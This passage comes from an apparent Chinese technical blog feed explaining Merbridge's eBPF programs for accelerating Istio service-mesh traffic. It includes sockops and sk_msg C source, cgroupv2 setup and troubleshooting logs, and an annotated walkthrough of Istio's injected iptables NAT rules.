class="meta-string">&lt;linux/in.h&gt;</span></span></span><br><span class="line"><span class="comment">//在socket发起 sendmsg 系统调用时触发执行</span></span><br><span class="line">__section(<span class="string">"sk_msg"</span>) </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">mb_msg_redir</span><span class="params">(struct sk_msg_md *msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//这里的结构体就是sock_pair_map中的key</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pair</span> <span class="title">p</span> = &#123;</span></span><br><span class="line">        .sip = msg-&gt;local_ip4,</span><br><span class="line">        .sport = msg-&gt;local_port,</span><br><span class="line">        .dip = msg-&gt;remote_ip4,</span><br><span class="line">        .dport = msg-&gt;remote_port &gt;&gt; <span class="number">16</span>,</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="comment">//根据四元组信息，从sock_pair_map中读取sock</span></span><br><span class="line">    <span class="comment">//然后通过bpf_msg_redirect_hash直接转发，加速请求</span></span><br><span class="line">    <span class="keyword">long</span> ret = bpf_msg_redirect_hash(msg, &amp;sock_pair_map, &amp;p, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (ret)</span><br><span class="line">        debugf(<span class="string">"redirect %d bytes with eBPF successfully"</span>, msg-&gt;size);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> ____license[] __section(<span class="string">"license"</span>) = <span class="string">"GPL"</span>;</span><br><span class="line"><span class="keyword">int</span> _version __section(<span class="string">"version"</span>) = <span class="number">1</span>;</span><br></pre></td></tr></table></figure><p><code>bpf_msg_redirect_hash</code>参数解析</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bpf_msg_redirect_hash(msg, &amp;sock_pair_map, &amp;p, <span class="number">0</span>);</span><br></pre></td></tr></table></figure><ul><li>msg：用户可访问的待发送数据的元信息</li><li>sock_pair_map：这个BPF程序attach到的<code>sockhash map</code></li><li>p：在<code>map</code>中索引用的<code>key</code></li><li>0：<code>BPF_F_INGRESS</code>，放到对端的哪个<code>queue</code></li></ul><h5 id="mb-sockops-c"><a href="#mb-sockops-c" class="headerlink" title="mb_sockops.c"></a><code>mb_sockops.c</code></h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"headers/helpers.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"headers/maps.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"headers/mesh.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/bpf.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/in.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">int</span> <span class="title">sockops_ipv4</span><span class="params">(struct bpf_sock_ops *skops)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//获取当前netns的cookie</span></span><br><span class="line">    __u64 cookie = bpf_get_socket_cookie_ops(skops);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//在cookie_original_dst查找与cookie相关的条目</span></span><br><span class="line">    <span class="keyword">void</span> *dst = bpf_map_lookup_elem(&amp;cookie_original_dst, &amp;cookie);</span><br><span class="line">    <span class="comment">//如果存在cookie</span></span><br><span class="line">    <span class="keyword">if</span> (dst) &#123;</span><br><span class="line">        <span class="comment">//dd保存原始目的信息</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">origin_info</span> <span class="title">dd</span> = *(<span class="title">struct</span> <span class="title">origin_info</span> *)<span class="title">dst</span>;</span></span><br><span class="line">        <span class="keyword">if</span> (!(dd.flags &amp; <span class="number">1</span>)) &#123;</span><br><span class="line">            __u32 pid = dd.pid;</span><br><span class="line">            <span class="comment">// 判断源IP和目的地址IP是否一致</span></span><br><span class="line">            <span class="keyword">if</span> (skops-&gt;local_ip4 == <span class="number">100663423</span> ||</span><br><span class="line">                skops-&gt;local_ip4 == skops-&gt;remote_ip4) &#123;</span><br><span class="line">                <span class="comment">//如果一致，代表发送了错误的请求</span></span><br><span class="line">                __u32 ip = skops-&gt;remote_ip4;</span><br><span class="line">                debugf(<span class="string">"detected process %d's ip is %d"</span>, pid, ip);</span><br><span class="line">                <span class="comment">//并将当前的ProcessID和IP信息写入process_ip这个map</span></span><br><span class="line">                bpf_map_update_elem(&amp;process_ip, &amp;pid, &amp;ip, BPF_ANY);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> USE_RECONNECT</span></span><br><span class="line">                <span class="comment">//bpf_htons:主机序到网络序</span></span><br><span class="line">                <span class="comment">//判断远程端口是不是15006端口，如果是的话则丢弃这个连接</span></span><br><span class="line">                <span class="keyword">if</span> (skops-&gt;remote_port &gt;&gt; <span class="number">16</span> == bpf_htons(IN_REDIRECT_PORT)) &#123;</span><br><span class="line">                    printk(<span class="string">"incorrect connection: cookie=%d"</span>, cookie);</span><br><span class="line">                    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">                &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">// envoy to envoy</span></span><br><span class="line">                __u32 ip = skops-&gt;local_ip4;</span><br><span class="line">                <span class="comment">//将当前的ProcessID和IP信息写入process_ip这个map</span></span><br><span class="line">                bpf_map_update_elem(&amp;process_ip, &amp;pid, &amp;ip, BPF_ANY);</span><br><span class="line">                debugf(<span class="string">"detected process %d's ip is %d"</span>, pid, ip);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// get_sockopts can read pid and cookie,</span></span><br><span class="line">        <span class="comment">// we should write a new map named pair_original_dst</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">pair</span> <span class="title">p</span> = &#123;</span></span><br><span class="line">            .sip = skops-&gt;local_ip4,</span><br><span class="line">            .sport = skops-&gt;local_port,</span><br><span class="line">            .dip = skops-&gt;remote_ip4,</span><br><span class="line">            .dport = skops-&gt;remote_port &gt;&gt; <span class="number">16</span>,</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">//将四元组信息和对应的原始目的地址写入pair_original_dst中</span></span><br><span class="line">        bpf_map_update_elem(&amp;pair_original_dst, &amp;p, &amp;dd, BPF_NOEXIST);</span><br><span class="line">        <span class="comment">//将当前sock和四元组保存在sock_pair_map中</span></span><br><span class="line">        bpf_sock_hash_update(skops, &amp;sock_pair_map, &amp;p, BPF_NOEXIST);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//监听socket事件</span></span><br><span class="line">__section(<span class="string">"sockops"</span>) <span class="function"><span class="keyword">int</span> <span class="title">mb_sockops</span><span class="params">(struct bpf_sock_ops *skops)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __u32 family, op;</span><br><span class="line">    family = skops-&gt;family;</span><br><span class="line">    op = skops-&gt;op;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (op) &#123;</span><br><span class="line">    <span class="comment">// case BPF_SOCK_OPS_PASSIVE_ESTABLISHED_CB://被动建连</span></span><br><span class="line">    <span class="keyword">case</span> BPF_SOCK_OPS_ACTIVE_ESTABLISHED_CB:  <span class="comment">// 主动建连</span></span><br><span class="line">        <span class="keyword">if</span> (family == <span class="number">2</span>) &#123; <span class="comment">// AFI_NET, we dont include socket.h, because it may</span></span><br><span class="line">                           <span class="comment">// cause an import error.</span></span><br><span class="line">            <span class="keyword">if</span> (sockops_ipv4(skops)) <span class="comment">//记录socket信息到sockmap</span></span><br><span class="line">                <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> ____license[] __section(<span class="string">"license"</span>) = <span class="string">"GPL"</span>;</span><br><span class="line"><span class="keyword">int</span> _version __section(<span class="string">"version"</span>) = <span class="number">1</span>;</span><br></pre></td></tr></table></figure><h4 id="启用cgroupv2产生的问题"><a href="#启用cgroupv2产生的问题" class="headerlink" title="启用cgroupv2产生的问题"></a>启用cgroupv2产生的问题</h4><h5 id="如何启动cgroupv2"><a href="#如何启动cgroupv2" class="headerlink" title="如何启动cgroupv2"></a>如何启动cgroupv2</h5><p>调整<code>grub linux</code>内核引导参数</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo vim /etc/default/grub</span><br></pre></td></tr></table></figure><p>修改<code>GRUB_CMDLINE_LINUX</code>为<code>systemd.unified_cgroup_hierarchy=1</code></p><p>更新<code>grub</code>并重启</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo update-grub</span><br><span class="line">sudo reboot</span><br></pre></td></tr></table></figure><p>判断是否启用cgroupv2</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~$ cat /sys/fs/cgroup/cgroup.controllers</span><br><span class="line">cpuset cpu io memory hugetlb pids rdma</span><br></pre></td></tr></table></figure><p>在没有启用<code>cgroupv2</code>时，拉取<code>merbridge</code>镜像之后，执行<code>docker run</code>指令会报如下错误</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~# docker run -it --privileged 605389bb6641</span><br><span class="line">[ -f bpf/mb_connect.c ] &amp;&amp; make -C bpf load || make -C bpf load-from-obj</span><br><span class="line">make[1]: Entering directory '/app/bpf'</span><br><span class="line">Makefile:29: *** It looks like your system does not have cgroupv2 enabled, or the automatic recognition fails. Please enable cgroupv2, or specify the path of cgroupv2 manually via CGROUP2_PATH parameter..  Stop.</span><br><span class="line">make[1]: Leaving directory '/app/bpf'</span><br><span class="line">make[1]: Entering directory '/app/bpf'</span><br><span class="line">Makefile:29: *** It looks like your system does not have cgroupv2 enabled, or the automatic recognition fails. Please enable cgroupv2, or specify the path of cgroupv2 manually via CGROUP2_PATH parameter..  Stop.</span><br><span class="line">make[1]: Leaving directory '/app/bpf'</span><br><span class="line">make: *** [Makefile:3: load] Error 2</span><br><span class="line">panic: unexpected exit code: 2, err: exit status 2</span><br><span class="line">goroutine 1 [running]:</span><br><span class="line">main.main()</span><br><span class="line">        /app/cmd/mbctl/main.go:68 +0x725</span><br></pre></td></tr></table></figure><p>启用<code>cgroupv2</code>之后，<code>docker run</code>执行正常，可是k8s运行yaml会失败，查看pod报错如下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~# kubectl get pods -n istio-system</span><br><span class="line">NAME                                    READY   STATUS    RESTARTS      AGE</span><br><span class="line">istio-egressgateway-79bb75fcf9-lttmn    1/1     Running   1             3h10m</span><br><span class="line">istio-ingressgateway-84bfcfd895-p4wbx   1/1     Running   1             3h10m</span><br><span class="line">istiod-6c5cfd79db-vqvws                 1/1     Running   1             3h12m</span><br><span class="line">merbridge-9dhf2                         0/1     Error     1 (15s ago)   23s</span><br><span class="line">root@ubuntu:~# kubectl logs merbridge-9dhf2 -n istio-system</span><br><span class="line">[ -f bpf/mb_connect.c ] &amp;&amp; make -C bpf load || make -C bpf load-from-obj</span><br><span class="line">make[1]: Entering directory '/app/bpf'</span><br><span class="line">clang -O2 -g  -Wall -target bpf -I/usr/include/x86_64-linux-gnu  -DMESH=1 -DUSE_RECONNECT -c mb_connect.c -o mb_connect.o</span><br><span class="line">clang -O2 -g  -Wall -target bpf -I/usr/include/x86_64-linux-gnu  -DMESH=1 -DUSE_RECONNECT -c mb_get_sockopts.c -o mb_get_sockopts.o</span><br><span class="line">clang -O2 -g  -Wall -target bpf -I/usr/include/x86_64-linux-gnu  -DMESH=1 -DUSE_RECONNECT -c mb_redir.c -o mb_redir.o</span><br><span class="line">clang -O2 -g  -Wall -target bpf -I/usr/include/x86_64-linux-gnu  -DMESH=1 -DUSE_RECONNECT -c mb_sockops.c -o mb_sockops.o</span><br><span class="line">clang -O2 -g  -Wall -target bpf -I/usr/include/x86_64-linux-gnu  -DMESH=1 -DUSE_RECONNECT -c mb_bind.c -o mb_bind.o</span><br><span class="line">[ -f /sys/fs/bpf/cookie_original_dst ] || sudo bpftool map create /sys/fs/bpf/cookie_original_dst type lru_hash key 4 value 12 entries 65535 name cookie_original_dst</span><br><span class="line">[ -f /sys/fs/bpf/local_pod_ips ] || sudo bpftool map create /sys/fs/bpf/local_pod_ips type hash key 4 value 4 entries 1024 name local_pod_ips</span><br><span class="line">[ -f /sys/fs/bpf/process_ip ] || sudo bpftool map create /sys/fs/bpf/process_ip type lru_hash key 4 value 4 entries 1024 name process_ip</span><br><span class="line">sudo bpftool prog load mb_connect.o /sys/fs/bpf/connect \</span><br><span class="line">        map name cookie_original_dst pinned /sys/fs/bpf/cookie_original_dst \</span><br><span class="line">        map name local_pod_ips pinned /sys/fs/bpf/local_pod_ips \</span><br><span class="line">        map name process_ip pinned /sys/fs/bpf/process_ip</span><br><span class="line">sudo bpftool cgroup attach /sys/fs/cgroup /sys/fs/cgroup/unified connect4 pinned /sys/fs/bpf/connect</span><br><span class="line">Error: invalid attach type</span><br><span class="line">make[1]: *** [Makefile:90: load-connect] Error 255</span><br><span class="line">make[1]: Leaving directory '/app/bpf'</span><br><span class="line">make[1]: Entering directory '/app/bpf'</span><br><span class="line">[ -f /sys/fs/bpf/cookie_original_dst ] || sudo bpftool map create /sys/fs/bpf/cookie_original_dst type lru_hash key 4 value 12 entries 65535 name cookie_original_dst</span><br><span class="line">[ -f /sys/fs/bpf/local_pod_ips ] || sudo bpftool map create /sys/fs/bpf/local_pod_ips type hash key 4 value 4 entries 1024 name local_pod_ips</span><br><span class="line">[ -f /sys/fs/bpf/process_ip ] || sudo bpftool map create /sys/fs/bpf/process_ip type lru_hash key 4 value 4 entries 1024 name process_ip</span><br><span class="line">sudo bpftool prog load mb_connect.o /sys/fs/bpf/connect \</span><br><span class="line">        map name cookie_original_dst pinned /sys/fs/bpf/cookie_original_dst \</span><br><span class="line">        map name local_pod_ips pinned /sys/fs/bpf/local_pod_ips \</span><br><span class="line">        map name process_ip pinned /sys/fs/bpf/process_ip</span><br><span class="line">Error: failed to pin program cgroup/connect4</span><br><span class="line">make[1]: *** [Makefile:89: load-connect] Error 255</span><br><span class="line">make[1]: Leaving directory '/app/bpf'</span><br><span class="line">make: *** [Makefile:3: load] Error 2</span><br><span class="line">panic: unexpected exit code: 2, err: exit status 2</span><br><span class="line">goroutine 1 [running]:</span><br><span class="line">main.main()</span><br><span class="line">        /app/cmd/mbctl/main.go:68 +0x725</span><br></pre></td></tr></table></figure><p>最后发现，cgroup v2 是单一层级树，因此只有一个挂载点即<code>/sys/fs/cgroup/unified</code></p><p><a href="https://github.com/merbridge/merbridge/issues/60" target="_blank" rel="noopener">https://github.com/merbridge/merbridge/issues/60</a></p><h4 id="iptables注入解析"><a href="#iptables注入解析" class="headerlink" title="iptables注入解析"></a>iptables注入解析</h4><p>查看<code>productpage</code> pod的<code>istio-proxy</code>容器中的进程</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~# docker top `docker ps|grep "istio-proxy_productpage"|cut -d " " -f1`</span><br><span class="line">UID                 PID                 PPID                C                   STIME               TTY                 TIME                CMD</span><br><span class="line">1337                9391                9369                0                   Feb16               ?                   00:03:14            /usr/local/bin/pilot-agent proxy sidecar --domain default.svc.cluster.local --proxyLogLevel=warning --proxyComponentLogLevel=misc:error --log_output_level=default:info --concurrency 2</span><br><span class="line">1337                10017               9391                0                   Feb16               ?                   00:18:42            /usr/local/bin/envoy -c etc/istio/proxy/envoy-rev0.json --restart-epoch 0 --drain-time-s 45 --drain-strategy immediate --parent-shutdown-time-s 60 --local-address-ip-version v4 --bootstrap-version 3 --file-flush-interval-msec 1000 --disable-hot-restart --log-format %Y-%m-%dT%T.%fZ?%l?envoy %n?%v -l warning --component-log-level misc:error --concurrency 2</span><br></pre></td></tr></table></figure><p>nsenter进入sidecar容器的命名空间</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~# nsenter -n --target 9391</span><br></pre></td></tr></table></figure><p>在该进程的命名空间下查看其 iptables 规则链</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">查看NAT表中规则配置的详细信息</span></span><br><span class="line">root@ubuntu:~# iptables -t nat -L -v</span><br><span class="line"><span class="meta">#</span><span class="bash">PREROUTING链：用于目标地址转换，将所有入站TCP流量跳转到ISTIO_INBOUND链上</span></span><br><span class="line">Chain PREROUTING (policy ACCEPT 215K packets, 13M bytes)</span><br><span class="line"> pkts bytes target     prot opt in     out     source               destination</span><br><span class="line"> 216K   13M ISTIO_INBOUND  tcp  --  any    any     anywhere             anywhere</span><br><span class="line"><span class="meta">#</span><span class="bash">INPUT链：处理输入数据包，非TCP流量将继续走OUTPUT链</span></span><br><span class="line">Chain INPUT (policy ACCEPT 216K packets, 13M bytes)</span><br><span class="line"> pkts bytes target     prot opt in     out     source               destination</span><br><span class="line"><span class="meta">#</span><span class="bash">OUTPUT链：将所有出站数据包跳转到ISTIO_OUTPUT链上</span></span><br><span class="line">Chain OUTPUT (policy ACCEPT 25827 packets, 2191K bytes)</span><br><span class="line"> pkts bytes target     prot opt in     out     source               destination</span><br><span class="line"> 7274  436K ISTIO_OUTPUT  tcp  --  any    any     anywhere             anywhere</span><br><span class="line"><span class="meta">#</span><span class="bash">POSTROUTING链：所有数据包流出网卡时都要先进入POSTROUTING链，内核根据数据包目的地判断是否转发</span></span><br><span class="line">Chain POSTROUTING (policy ACCEPT 29847 packets, 2432K bytes)</span><br><span class="line"> pkts bytes target     prot opt in     out     source               destination</span><br><span class="line"><span class="meta">#</span><span class="bash">ISTIO_INBOUND链：将所有入站流量重定向到ISTIO_IN_REDIRECT链上</span></span><br><span class="line">Chain ISTIO_INBOUND (1 references)</span><br><span class="line"> pkts bytes target     prot opt in     out     source               destination</span><br><span class="line">    0     0 RETURN     tcp  --  any    any     anywhere             anywhere             tcp dpt:15008</span><br><span class="line">    0     0 RETURN     tcp  --  any    any     anywhere             anywhere             tcp dpt:ssh</span><br><span class="line">    0     0 RETURN     tcp  --  any    any     anywhere             anywhere             tcp dpt:15090</span><br><span class="line"> 215K   13M RETURN     tcp  --  any    any     anywhere             anywhere             tcp dpt:15021</span><br><span class="line">    0     0 RETURN     tcp  --  any    any     anywhere             anywhere             tcp dpt:15020</span><br><span class="line"> 1256 75360 ISTIO_IN_REDIRECT  tcp  --  any    any     anywhere             anywhere</span><br><span class="line"><span class="meta">#</span><span class="bash">ISTIO_IN_REDIRECT链：将所有的入站流量跳转到本地的15006端口，至此成功的拦截了流量到sidecar中</span></span><br><span class="line">Chain ISTIO_IN_REDIRECT (3 references)</span><br><span class="line"> pkts bytes target     prot opt in     out     source               destination</span><br><span class="line"> 1256 75360 REDIRECT   tcp  --  any    any     anywhere             anywhere             redir ports 15006</span><br><span class="line"><span class="meta">#</span><span class="bash">ISTIO_OUTPUT链：选择需要重定向到Envoy（即本地） 的出站流量</span></span><br><span class="line">Chain ISTIO_OUTPUT (1 references)</span><br><span class="line"> pkts bytes target     prot opt in     out     source               destination</span><br><span class="line"> 2479  149K RETURN     all  --  any    lo      127.0.0.6            anywhere</span><br><span class="line">    0     0 ISTIO_IN_REDIRECT  all  --  any    lo      anywhere            !localhost            owner UID match 1337</span><br><span class="line">    0     0 RETURN     all  --  any    lo      anywhere             anywhere             ! owner UID match 1337</span><br><span class="line">  775 46500 RETURN     all  --  any    any     anywhere             anywhere             owner UID match 1337</span><br><span class="line">    0     0 ISTIO_IN_REDIRECT  all  --  any    lo      anywhere            !localhost            owner GID match 1337</span><br><span class="line">    0     0 RETURN     all  --  any    lo      anywhere             anywhere             ! owner GID match 1337</span><br><span class="line">    0     0 RETURN     all  --  any    any     anywhere             anywhere             owner GID match 1337</span><br><span class="line">    0     0 RETURN     all  --  any    any     anywhere             localhost</span><br><span class="line"> 4020  241K ISTIO_REDIRECT  all  --  any    any     anywhere             anywhere</span><br><span class="line"><span class="meta">#</span><span class="bash">ISTIO_REDIRECT链：将所有流量重定向到Sidecar（即本地）的15001端口</span></span><br><span class="line">Chain ISTIO_REDIRECT (1 references)</span><br><span class="line"> pkts bytes target     prot opt in     out     source               destination</span><br><span class="line"> 4020  241K REDIRECT   tcp  --  any    any     anywhere             anywhere             redir ports 15001</span><br></pre></td></tr></table></figure><h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><ul><li><a href="https://istio.io/latest/zh/docs/" target="_blank" rel="noopener">https://istio.io/latest/zh/docs/</a></li><li><a href="https://github.com/iovisor/bcc/blob/master/docs/reference_guide.md" target="_blank" rel="noopener">https://github.com/iovisor/bcc/blob/master/docs/reference_guide.md</a></li><li><a href="https://arthurchiao.art/blog/cgroupv2-zh/" target="_blank" rel="noopener">https://arthurchiao.art/blog/cgroupv2-zh/</a></li><li><a href="https://arthurchiao.art/blog/bpf-advanced-notes-1-zh/" target="_blank" rel="noopener">https://arthurchiao.art/blog/bpf-advanced-notes-1-zh/</a></li><li><a href="https://www.zsythink.net/archives/1199" target="_blank" rel="noopener">https://www.zsythink.net/archives/1199</a></li><li><a href="https://github.com/istio/istio/tree/master/samples" target="_blank" rel="noopener">https://github.com/istio/istio/tree/master/samples</a></li><li><a href="https://jimmysong.io/blog/envoy-sidecar-injection-in-istio-service-mesh-deep-dive/" target="_blank" rel="noopener">https://jimmysong.io/blog/envoy-sidecar-injection-in-istio-service-mesh-deep-dive/</a></li><li><a href="https://buaq.net/go-78524.html" target="_blank" rel="noopener">https://buaq.net/go-78524.html</a></li><li><a href="https://kubernetes.io/zh/docs/reference/access-authn-authz/rbac/" target="_blank" rel="noopener">https://kubernetes.io/zh/docs/reference/access-authn-authz/rbac/</a></li><li><a href="https://manpages.ubuntu.com/manpages/focal/man7/bpf-helpers.7.html" target="_blank" rel="noopener">https://manpages.ubuntu.com/manpages/focal/man7/bpf-helpers.7.html</a></li><li><a href="https://github.com/torvalds/linux/blob/master/tools/testing/selftests/bpf/progs/sockopt_sk.c" target="_blank" rel="noopener">https://github.com/torvalds/linux/blob/master/tools/testing/selftests/bpf/progs/sockopt_sk.c</a></li><li><a href="https://github.com/torvalds/linux/blob/cfb92440ee71adcc2105b0890bb01ac3cddb8507/include/uapi/linux/netfilter_ipv4.h#L52" target="_blank" rel="noopener">https://github.com/torvalds/linux/blob/cfb92440ee71adcc2105b0890bb01ac3cddb8507/include/uapi/linux/netfilter_ipv4.h#L52</a></li><li><a href="https://www.cnblogs.com/tencent-cloud-native/p/15696518.html" target="_blank" rel="noopener">https://www.cnblogs.com/tencent-cloud-native/p/15696518.html</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;环境准备&quot;&gt;&lt;a href=&quot;#环境准备&quot; class=&quot;headerlink&quot; title=&quot;环境准备&quot;&gt;&lt;/a&gt;环境准备&lt;/h4&gt;&lt;h5 id=&quot;Docker安装&quot;&gt;&lt;a href=&quot;#Docker安装&quot; class=&quot;headerlink&quot; title=&quot;D
      
    
    </summary>
    
    
      <category term="Cloud Security" scheme="elssm.github.io/tags/Cloud-Security/"/>
    
  </entry>
  
  <entry>
    <title>浅入浅出eBPF</title>
    <link href="elssm.github.io/2022/01/21/%E6%B5%85%E5%85%A5%E6%B5%85%E5%87%BAeBPF/"/>
    <id>elssm.github.io/2022/01/21/浅入浅出eBPF/</id>
    <published>2022-01-21T01:19:21.000Z</published>
    <updated>2022-01-27T08:46:03.508Z</updated>
    
